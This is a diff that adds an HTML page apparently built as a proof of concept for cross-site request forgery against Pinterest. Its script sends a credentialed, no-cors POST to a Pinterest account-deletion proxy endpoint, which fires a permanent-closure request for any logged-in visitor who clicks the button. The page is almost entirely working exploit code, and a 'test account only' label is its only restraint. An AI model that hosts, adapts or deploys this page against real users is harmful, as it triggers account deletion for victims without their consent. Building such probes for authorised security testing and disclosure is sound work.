@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="utf-8"><title>request_delete CSRF probe</title></head>
+<body style="font:14px monospace; background:#0d1117; color:#e6edf3; padding:30px">
+<h3>CSRF probe: v3_user_request_permanent_closure via ask proxy</h3>
+<p>This page is on akashsebastian.com. It sends an empty-body POST to the ask proxy with no-cors.
+If you are logged in to Pinterest, the closure request fires for your account.</p>
+<button id="fire">Send the POST (test account only)</button>
+<pre id="out">not sent</pre>
+<script>
+document.getElementById('fire').onclick = function(){
+  fetch('https://ask.pinterest.com/api/proxy/pinterest/users/request_delete/', {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: {'Content-Type': 'text/plain'}
+  }).then(function(){
+    document.getElementById('out').textContent = 'sent (opaque response). Check your email for the closure link.';
+  }).catch(function(e){
+    document.getElementById('out').textContent = 'ERR ' + e.message;
+  });
+};
+</script>
+</body>
+</html>
